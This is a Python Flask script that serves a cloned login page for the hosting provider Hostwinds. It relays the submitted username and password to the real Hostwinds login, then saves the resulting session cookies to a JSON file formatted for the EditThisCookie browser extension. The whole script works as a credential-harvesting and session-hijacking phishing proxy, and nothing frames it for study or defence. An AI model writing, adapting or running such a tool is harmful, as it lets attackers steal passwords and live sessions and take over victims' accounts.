from flask import Flask, request, render_template_string, redirect, make_response
import requests
from bs4 import BeautifulSoup
import json
import time

# Initialize Flask app
app = Flask(__name__)

# Target action URL where you want to send login info
ACTION_URL = 'https://clients.hostwinds.com/dologin.php'

# HTML form template for login
HTML_FORM = """
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
  </head>
  <body>
    <h2>Login to Hostwinds</h2>
    <form action="/login" method="POST">
      <label for="username">Username:</label>
      <input type="text" name="username" id="username" required><br><br>
      <label for="password">Password:</label>
      <input type="password" name="password" id="password" required><br><br>
      <input type="submit" value="Login">
    </form>
  </body>
</html>
"""

# File where cookies will be saved
COOKIE_FILE = 'editthiscookie_cookies.json'

@app.route('/')
def index():
    # Render the login form
    return render_template_string(HTML_FORM)

@app.route('/login', methods=['POST'])
def login():
    # Extract username and password from the form
    username = request.form['username']
    password = request.form['password']
    
    # Start a session to persist cookies and headers
    with requests.Session() as session:
        # Send a GET request to fetch the login page (to get any necessary tokens)
        response = session.get('https://clients.hostwinds.com/clientarea.php')

        # Parse the login page for hidden input fields (e.g., CSRF tokens)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Look for hidden form fields (adjust based on actual form field names)
        hidden_fields = {
            'username': username,
            'password': password,
        }
        
        for input_tag in soup.find_all('input', type='hidden'):
            hidden_fields[input_tag['name']] = input_tag['value']

        # Send POST request to the action URL with login data
        login_response = session.post(ACTION_URL, data=hidden_fields)

        # Check if the login was successful
        if login_response.status_code == 200:
            # Capture the cookies from the session
            cookies = session.cookies.get_dict()

            # Format cookies for EditThisCookie
            formatted_cookies = []
            for name, value in cookies.items():
                cookie = {
                    'domain': '.hostwinds.com',  # Set the domain to match the target site
                    'expirationDate': int(time.time()) + 3600,  # Set expiration to 1 hour from now
                    'hostOnly': False,
                    'httpOnly': False,
                    'name': name,
                    'path': '/',
                    'secure': False,
                    'session': True,  # Make it a session cookie (set to False if you need to persist it)
                    'value': value
                }
                formatted_cookies.append(cookie)

            # Save formatted cookies to a JSON file
            with open(COOKIE_FILE, 'w') as cookie_file:
                json.dump(formatted_cookies, cookie_file)

            # Create a response object and set the cookies in the response header
            resp = make_response(redirect('/'))
            for cookie in formatted_cookies:
                resp.set_cookie(cookie['name'], cookie['value'], domain=cookie['domain'], path=cookie['path'])

            # Return the response with the cookies set, redirecting to the original form
            return resp
        else:
            return "Login failed! Please check your credentials."

if __name__ == '__main__':
    # Run the Flask app on a local server
    app.run(debug=True, host='0.0.0.0', port=5000)
